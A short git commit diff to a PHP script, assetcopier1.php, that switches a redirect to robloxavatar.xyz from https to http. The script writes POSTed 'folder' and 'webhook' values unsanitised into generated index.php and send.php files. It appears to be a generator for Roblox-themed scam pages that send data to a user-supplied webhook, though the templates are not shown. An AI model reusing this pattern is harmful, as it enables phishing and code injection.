8bab33d9d2f8ed049b759302aba4d2a40a0d8b21
zllex <95177117+zllex@users.noreply.github.com>
2022-01-15 18:00:36 +0200

    Update assetcopier1.php

--- assetcopier1.php
+++ assetcopier1.php
@@ -8,6 +8,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
     fwrite(fopen($dir.'/index.php', "w"), str_replace("{folder}", $_POST['folder'], file_get_contents("assetcopierfiles/index.php")));
     fwrite(fopen($dir.'/send.php', "w"), str_replace("{folder}", $_POST['folder'], str_replace("{whook}", $_POST['webhook'], file_get_contents("assetcopierfiles/send.php"))));
-    header("location: https://robloxavatar.xyz/$dir");
+    header("location: http://robloxavatar.xyz/$dir");
 }
 ?>
